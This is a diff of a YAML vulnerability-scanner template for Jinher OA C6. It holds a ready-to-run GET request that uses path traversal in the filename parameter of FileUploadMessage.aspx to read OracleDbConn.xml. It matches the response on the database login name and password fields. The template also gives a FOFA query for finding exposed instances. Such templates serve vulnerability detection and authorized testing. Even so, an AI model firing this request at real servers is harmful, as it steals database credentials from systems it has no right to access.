@@ -1,27 +1,29 @@
-# 来源: afrog（转换自 afrog/xray 表达式 POC）
+id: jinher-oa-c6-fileuploadmessage-fileread
+
+info:
+  name: 金和 OA C6 FileUploadMessage 任意文件读取
+  author: zan8in
+  severity: high
+  description: |
+    金和 OA C6 FileUploadMessage.aspx 的 filename 参数可穿越读取 OracleDbConn.xml，泄露数据库账号口令。
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="金和网络-金和OA"
+  tags: jinher,c6,lfi,disclosure
+
 http:
-  - matchers:
-      - type: status
-        status:
-          - 200
+  - method: GET
+    path:
+      - "{{BaseURL}}/C6/JHSoft.WCF/FunctionNew/FileUploadMessage.aspx?filename=../../../C6/JhSoft.Web.Dossier.JG/JhSoft.Web.Dossier.JG/XMLFile/OracleDbConn.xml"
+    matchers-condition: and
+    matchers:
       - type: word
         part: body
         words:
-          - <DbLoginName>
-          - <DbLoginPass>
+          - "<DbLoginName>"
+          - "<DbLoginPass>"
         condition: and
-    method: GET
-    path:
-      - '{{BaseURL}}/C6/JHSoft.WCF/FunctionNew/FileUploadMessage.aspx?filename=../../../C6/JhSoft.Web.Dossier.JG/JhSoft.Web.Dossier.JG/XMLFile/OracleDbConn.xml'
-id: jinher-oa-c6-fileuploadmessage-fileread
-info:
-  author: zan8in
-  description: 'fofa: app="金和网络-金和OA"'
-  metadata:
-    argus-execution-class: detection
-    argus-import-license: MIT License
-    argus-import-source: afrog
-    argus-risk-level: high
-  name: 金和OA C6 fileuploadmessage 任意文件读取漏洞
-  severity: high
-  tags: jinher,oa,fileread,argus-import
+      - type: status
+        status:
+          - 200
